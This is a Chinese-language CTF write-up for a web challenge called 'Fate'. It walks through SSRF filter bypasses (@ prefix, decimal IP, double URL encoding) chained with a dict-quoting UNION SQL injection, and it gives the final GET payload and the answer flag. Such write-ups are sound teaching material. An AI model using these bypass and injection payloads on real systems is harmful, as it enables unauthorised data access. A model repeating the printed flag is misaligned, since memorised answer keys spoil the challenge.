# Fate

> 分类：Web

## 题目描述

签到题。SSRF（URL 二次编码绕过字母过滤）+ json 反序列化（格式化字符串漏洞）+ SQL 注入。flag 在 `FATETABLE` 的 `LAMENTXU` 记录里。

## 考察知识点

- SSRF（@ 绕过 + 十进制 IP + 二次 URL 编码）
- Python 格式化字符串漏洞（json.loads + 字典强转字符串）
- SQL 注入（UNION SELECT）

## 解法

**第一步：SSRF**。目标拼上 `lamentxu.top`，禁止所有字母和 `.`。

1. `@` 绕过域名前缀。
2. `2130706433` 表示 `127.0.0.1`。
3. 参数 `0` 要传 `abcdefghi`，用二次 URL 编码绕过字母过滤。

**第二步：SQL 注入**。flag 在 `LamentXU` 对应的 FATE 值里，但 `LamentXU` 长度 >6 不能直接查询。利用 `json.loads` 后用字典强转字符串自带单引号闭合，打 UNION 注入：

```python
def string_to_binary(input_string):
    return ''.join(format(ord(char), '08b') for char in input_string)

test = """{"name":{"'))))))) UNION SELECT FATE FROM FATETABLE WHERE NAME='LAMENTXU' --":1}}"""
print(string_to_binary(test))
```

拼接后的 sql：

```sql
SELECT FATE FROM FATETABLE WHERE NAME=UPPER(...UPPER('{"'))))))) UNION SELECT FATE FROM FATETABLE WHERE NAME='LAMENTXU' --":1}')))))))
```

最终 payload：

```
GET /proxy?url=@2130706433:8080/1337?1=<二进制>&0=%2561%2562%2563%2564%2565%2566%2567%2568%2569
```

## 参考答案

`flag{Do4t_bElIevE_in_FatE_3EcaUse_f3Te_rESt_1n_OuR_hAnd}`

## 来源

- 作者：LamentXU（出题人） | https://www.cnblogs.com/LAMENTXU/articles/18730353
- 作者：竹言笙熙 | https://blog.csdn.net/oyf3085227433/article/details/147075769
